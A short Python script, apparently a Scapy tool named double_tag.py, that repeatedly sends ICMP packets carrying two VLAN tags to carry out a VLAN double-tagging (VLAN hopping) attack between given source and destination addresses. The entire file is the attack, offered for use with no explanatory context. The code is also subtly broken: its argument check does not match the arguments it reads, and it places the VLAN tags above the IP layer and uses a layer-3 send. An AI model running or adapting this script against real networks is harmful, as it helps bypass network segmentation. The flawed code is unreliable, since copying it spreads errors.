from scapy.all import *
import sys

if (len(sys.argv) !=4):
    print("Usage: double_tag.py first_tag second_tag src_ip dst_ip")
    sys.exit(0)

first_tag = int(sys.argv[1])
second_tag = int(sys.argv[2])
src_ip = sys.argv[3]
dst_ip = sys.argv[4]

try:
    while True:
        pkt = IP(src=src_ip, dst=dst_ip)/Dot1Q(vlan=first_tag)/Dot1Q(vlan=second_tag)/ICMP()
        send(pkt)
except KeyboardInterrupt:
    sys.exit(0)